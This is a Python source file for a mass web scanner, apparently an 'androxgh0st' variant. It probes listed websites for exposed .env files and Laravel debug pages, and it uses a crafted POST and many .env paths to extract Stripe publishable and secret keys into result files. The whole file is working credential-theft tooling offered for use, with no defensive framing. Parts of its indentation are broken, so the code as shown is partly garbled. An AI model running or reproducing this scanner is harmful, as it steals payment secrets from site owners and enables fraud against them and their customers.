# _*_ coding: utf-8 _*_
import requests, os, sys, json, time, signal, atexit
from re import findall as reg
import re
import logging
requests.packages.urllib3.disable_warnings()
from threading import *
from threading import Thread, Lock
from configparser import ConfigParser
from queue import Queue

# Create directories first before logging setup
try:
	os.mkdir('Results')
except:
	pass
try:
	os.mkdir('Results/logsites')
except:
	pass

# Setup logging for long-running processes
logging.basicConfig(
	level=logging.INFO,
	format='%(asctime)s - %(levelname)s - %(message)s',
	handlers=[
		logging.FileHandler('Results/scan.log'),
		logging.StreamHandler()
	]
)
logger = logging.getLogger(__name__)

# Suppress urllib3 retry warnings (too noisy)
logging.getLogger('urllib3').setLevel(logging.ERROR)
logging.getLogger('urllib3.connectionpool').setLevel(logging.ERROR)

pid_restore = '.nero_swallowtail'

# Global runtime configuration (set in main)
SESSION = None
ARGS = None
FILE_LOCK = Lock()
PROGRESS_LOCK = Lock()
TOTAL_URLS = 0
PROCESSED_URLS = 0
FOUND_STRIPE = 0
ENV_PATHS = [
	"/.env",
	"/.env.local",
	"/.env.production",
	"/.env.staging",
	"/.env.development",
	"/.env.test",
	"/public/.env",
	"/public_html/.env",
	"/app/.env",
	"/app/config/.env",
	"/config/.env",
	"/config/.env.local",
	"/backend/.env",
	"/api/.env",
	"/admin/.env",
	"/core/.env",
	"/src/.env",
	"/www/.env",
	"/wwwroot/.env",
	"/htdocs/.env",
	"/var/www/.env",
	"/var/www/html/.env",
	"/home/user/.env",
	"/home/user/public_html/.env",
	"/staging/.env",
	"/dev/.env",
	"/production/.env",
	"/laravel/.env",
	"/laravel/public/.env",
	"/symfony/.env",
	"/symfony/.env.local",
	"/node_modules/.env",
	"/.env.example",
	"/static/.env.example",
	"/.env.backup",
	"/.env.old",
	"/.env.save",
	"/.env.bak",
	"/.env.orig"
]

# Precompiled regex for Stripe values: support optional quotes
RE_STRIPE_KEY = re.compile(r"\nSTRIPE_KEY=\s*(['\"])??(.*?)\1?\n")
RE_STRIPE_SECRET = re.compile(r"\nSTRIPE_SECRET=\s*(['\"])??(.*?)\1?\n")
RE_DBG_STRIPE_KEY = re.compile(r"<td>STRIPE_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>")
RE_DBG_STRIPE_SECRET = re.compile(r"<td>STRIPE_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>")

class Worker(Thread):
	def __init__(self, tasks):
		Thread.__init__(self)
		self.tasks = tasks
		self.daemon = True
		self.start()

	def run(self):
		while True:
			func, args, kargs = self.tasks.get()
			try: func(*args, **kargs)
			except Exception as e: print(e)
			self.tasks.task_done()

class ThreadPool:
	def __init__(self, num_threads):
		self.tasks = Queue(num_threads)
		for _ in range(num_threads): Worker(self.tasks)

	def add_task(self, func, *args, **kargs):
		self.tasks.put((func, args, kargs))

	def wait_completion(self):
		self.tasks.join()

class androxgh0st:
	def payment_api(self, text, url):
		# Only focus on Stripe. Return True if any Stripe key info is captured.
		if "STRIPE_KEY" not in text and "<td>STRIPE_KEY</td>" not in text and "<td>STRIPE_SECRET</td>" not in text:
			return False
		stripe_key = ''
		stripe_secret = ''
			if "STRIPE_KEY=" in text:
			method = '.env'
				try:
				stripe_key = RE_STRIPE_KEY.findall(text)[0][1]
				except:
					stripe_key = ''
				try:
				stripe_secret = RE_STRIPE_SECRET.findall(text)[0][1]
				except:
					stripe_secret = ''
		elif "<td>STRIPE_SECRET</td>" in text or "<td>STRIPE_KEY</td>" in text:
				method = 'debug'
				try:
				stripe_key = RE_DBG_STRIPE_KEY.findall(text)[0]
				except:
					stripe_key = ''
				try:
				stripe_secret = RE_DBG_STRIPE_SECRET.findall(text)[0]
				except:
					stripe_secret = ''
		else:
			return False
		build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nSTRIPE_KEY: '+str(stripe_key)+'\nSTRIPE_SECRET: '+str(stripe_secret)
					remover = str(build).replace('\r', '')
		with FILE_LOCK:
			with open('Results/STRIPE.txt', 'a') as save:
					save.write(remover+'\n\n')
			with open('Results/logsites/stripesite.txt','a') as saveurl:
				saveurl.write(str(url).replace('\r', '')+'\n')
			if ARGS and ARGS.json_out:
				with open(ARGS.json_out, 'a') as jf:
					entry = {"url": url, "method": method, "stripe_key": stripe_key, "stripe_secret": stripe_secret}
					jf.write(json.dumps(entry)+"\n")
					return True

def printf(text):
	''.join([str(item) for item in text])
	print(text + '\n')

def cleanup_handler(signum=None, frame=None):
	"""Graceful shutdown handler"""
	global PROCESSED_URLS, TOTAL_URLS, FOUND_STRIPE
	logger.info(f"Shutting down gracefully. Processed: {PROCESSED_URLS}/{TOTAL_URLS}, Found: {FOUND_STRIPE}")
	if SESSION:
		SESSION.close()
	sys.exit(0)

# Register signal handlers for graceful shutdown
signal.signal(signal.SIGINT, cleanup_handler)
signal.signal(signal.SIGTERM, cleanup_handler)
atexit.register(cleanup_handler)

def main(url):
	global PROCESSED_URLS, FOUND_STRIPE
	resp = False
	max_response_size = 10 * 1024 * 1024  # 10MB limit to prevent memory issues
	try:
		text = '\033[32;1m#\033[0m '+url
		headers = {'User-agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36'}
		# Try multiple .env paths
		paths_to_try = ARGS.paths if (ARGS and ARGS.paths) else ENV_PATHS
		for path in paths_to_try:
			try:
				get_source = SESSION.get(url+path, headers=headers, timeout=(ARGS.timeout if ARGS else 5), verify=(False if (ARGS and ARGS.insecure) else True), allow_redirects=(ARGS.redirects if ARGS else False), stream=True)
				if get_source.ok:
					# Limit response size to prevent memory issues
					content_length = get_source.headers.get('content-length')
					if content_length and int(content_length) > max_response_size:
						logger.warning(f"Response too large for {url+path}: {content_length} bytes")
						get_source.close()
						continue
					# Read in chunks to limit memory
					content = b''
					for chunk in get_source.iter_content(chunk_size=8192):
						content += chunk
						if len(content) > max_response_size:
							logger.warning(f"Response exceeded size limit for {url+path}")
							break
					text_content = content.decode('utf-8', errors='ignore')
					if "APP_KEY=" in text_content or "STRIPE_KEY" in text_content:
						resp = text_content
						break
			except Exception as e:
				logger.debug(f"Error accessing {url+path}: {str(e)}")
				pass
		# Fallback POST for debug leaks
		if not resp:
			try:
				post_source = SESSION.post(url, data={"0x[]":"androxgh0st"}, headers=headers, timeout=(ARGS.timeout if ARGS else 8), verify=(False if (ARGS and ARGS.insecure) else True), allow_redirects=(ARGS.redirects if ARGS else False), stream=True)
				if post_source.ok:
					content = b''
					for chunk in post_source.iter_content(chunk_size=8192):
						content += chunk
						if len(content) > max_response_size:
							break
					text_content = content.decode('utf-8', errors='ignore')
					if "<td>APP_KEY</td>" in text_content:
						resp = text_content
			except Exception as e:
				logger.debug(f"Error POST to {url}: {str(e)}")
				pass
		if resp:
			remover2 = str(url).replace('\r', '')
			with FILE_LOCK:
				with open('Results/logsites/vulnerable.txt','a') as save3:
			save3.write(remover2+'\n')
			getstripe = androxgh0st().payment_api(resp, url)
			if getstripe:
				text += ' | \033[32;1mSTRIPE\033[0m'
				FOUND_STRIPE += 1
			else:
				text += ' | \033[31;1mSTRIPE\033[0m'
		else:
			text += ' | \033[31;1mCan\'t get everything\033[0m'
			with FILE_LOCK:
				with open('Results/logsites/not_vulnerable.txt','a') as save:
					save.write(str(url).replace('\r', '')+'\n')
	except Exception as e:
		text = '\033[31;1m#\033[0m '+url
		text += ' | \033[31;1mCan\'t access sites\033[0m'
		logger.error(f"Exception processing {url}: {str(e)}")
		with FILE_LOCK:
			with open('Results/logsites/exception_sites.txt','a') as save:
				save.write(str(url).replace('\r', '')+'\n')
	finally:
		with PROGRESS_LOCK:
			PROCESSED_URLS += 1
			if PROCESSED_URLS % 100 == 0:
				progress = f"[{PROCESSED_URLS}/{TOTAL_URLS}] Found: {FOUND_STRIPE}"
				logger.info(progress)
				print(f"\033[36m{progress}\033[0m")
	printf(text)


if __name__ == '__main__':
	print(r'''=                       ____                          ,--. 
 ,--,     ,--,        ,'  , `.   ,---,              ,--.'| 
 |'. \   / .`|     ,-+-,.' _ |  '  .' \         ,--,:  : | 
 ; \ `\ /' / ;  ,-+-. ;   , || /  ;    '.    ,`--.'`|  ' : 
 `. \  /  / .' ,--.'|'   |  ;|:  :       \   |   :  :  | | 
  \  \/  / ./ |   |  ,', |  '::  |   /\   \  :   |   \ | : 
   \  \'  /  |   | /  | |  |||  :  ' ;.   : |   : '  '; | 
    \  ;  ;   '   | :  | :  |,|  |  ;/  \   \'   ' ;.    ; 
   / \  \  \  ;   . |  ; |--' '  :  | \  \ ,'|   | | \   | 
  ;  /\  \  \ |   : |  | ,    |  |  '  '--'  '   : |  ; .' 
/__;  \  ;  \|   : '  |/     |  :  :        |   | '`--'   
|   : / \  \  ;   | |`-'      |  | ,'        '   : |       
;   |/   \  ' |   ;/          `--''          ;   |.'       
`---'     `--`'---'                          '---'         
                                                           
''')
	try:
		readcfg = ConfigParser()
		readcfg.read(pid_restore)
		lists = readcfg.get('DB', 'FILES')
		numthread = readcfg.get('DB', 'THREAD')
		sessi = readcfg.get('DB', 'SESSION')
		print("log session bot found! restore session")
		print('''Using Configuration :\n\tFILES='''+lists+'''\n\tTHREAD='''+numthread+'''\n\tSESSION='''+sessi)
		tanya = input("Want to contineu session ? [Y/n] ")
		if "Y" in tanya or "y" in tanya:
			lerr = open(lists).read().split("\n"+sessi)[1]
			readsplit = lerr.splitlines()
		else:
			raise Exception("Skip restore session")
	except:
		import argparse
		parser = argparse.ArgumentParser(description='Env scanner for Stripe keys')
		parser.add_argument('--list', dest='list', help='Path to file containing URLs (one per line)')
		parser.add_argument('--threads', dest='threads', type=int, default=10, help='Number of threads')
		parser.add_argument('--timeout', dest='timeout', type=float, default=5.0, help='Request timeout in seconds')
		parser.add_argument('--retries', dest='retries', type=int, default=2, help='Max retries per request')
		parser.add_argument('--insecure', dest='insecure', action='store_true', help='Disable TLS verification')
		parser.add_argument('--redirects', dest='redirects', action='store_true', help='Allow redirects')
		parser.add_argument('--paths', dest='paths', nargs='*', help='Additional .env paths to try')
		parser.add_argument('--rate', dest='rate', type=float, default=0.0, help='Sleep seconds between requests per task')
		parser.add_argument('--json-out', dest='json_out', help='Write JSONL output to this file')
		args = parser.parse_args()
		if not args.list:
			args.list = input("websitelist ? ")
		try:
			readsplit = open(args.list).read().splitlines()
		except Exception:
				print("Wrong input or list not found!")
				exit()
		# Initialize global ARGS and SESSION
		ARGS = args
		s = requests.Session()
		try:
			from requests.adapters import HTTPAdapter
			from urllib3.util.retry import Retry
			retry = Retry(total=args.retries, backoff_factor=0.5, status_forcelist=[429, 500, 502, 503, 504], allowed_methods=["GET","POST"])
			adapter = HTTPAdapter(max_retries=retry, pool_connections=100, pool_maxsize=100)
			s.mount('http://', adapter)
			s.mount('https://', adapter)
		except Exception:
			pass
		SESSION = s
		numthread = args.threads
	# Initialize progress tracking
	TOTAL_URLS = len(readsplit)
	logger.info(f"Starting scan: {TOTAL_URLS} URLs, {numthread} threads")
	pool = ThreadPool(int(numthread))
	for url in readsplit:
		if "://" in url:
			url = url
		else:
			url = "http://"+url
		if url.endswith('/'):
			url = url[:-1]
		jagases = url
		try:
			if ARGS and ARGS.rate:
				time.sleep(ARGS.rate)
			pool.add_task(main, url)
		except KeyboardInterrupt:
			logger.info("Keyboard interrupt detected, saving session...")
			with open(pid_restore, 'w') as session:
				cfgsession = "[DB]\nFILES="+lists+"\nTHREAD="+str(numthread)+"\nSESSION="+jagases+"\nPROCESSED="+str(PROCESSED_URLS)+"\nTOTAL="+str(TOTAL_URLS)+"\nFOUND="+str(FOUND_STRIPE)+"\n"
			session.write(cfgsession)
			print(f"\nCTRL+C Detect, Session saved. Progress: {PROCESSED_URLS}/{TOTAL_URLS}, Found: {FOUND_STRIPE}")
			cleanup_handler()
	pool.wait_completion()
	# Final summary
	final_summary = f"\n{'='*60}\nScan completed!\nProcessed: {PROCESSED_URLS}/{TOTAL_URLS}\nFound Stripe keys: {FOUND_STRIPE}\n{'='*60}\n"
	logger.info(final_summary)
	print(final_summary)
	try:
		os.remove(pid_restore)
	except:
		pass
	# Cleanup
	if SESSION:
		SESSION.close()
